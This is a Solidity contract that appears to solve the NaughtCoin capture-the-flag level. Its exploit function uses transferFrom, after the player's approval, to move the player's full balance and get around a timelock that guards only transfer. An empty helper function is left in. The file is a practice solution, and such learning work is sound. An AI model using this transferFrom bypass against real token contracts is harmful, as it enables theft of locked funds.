// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/NaughtCoin.sol";

contract NaughtCoinHack {
    function exploit(NaughtCoin naughtCoin) external {
        // Get the player's balance
        uint256 playerBalance = naughtCoin.balanceOf(msg.sender);
        
        // The sender needs to approve this contract first
        // Then we can transfer using transferFrom which bypasses the lockTokens modifier
        naughtCoin.transferFrom(msg.sender, address(this), playerBalance);
    }
    
    // Helper function to perform the approval
    function approveAmount(NaughtCoin naughtCoin, uint256 amount) external {
        // This won't work because we can't call approve on behalf of the player
        // The player needs to call approve directly
    }
}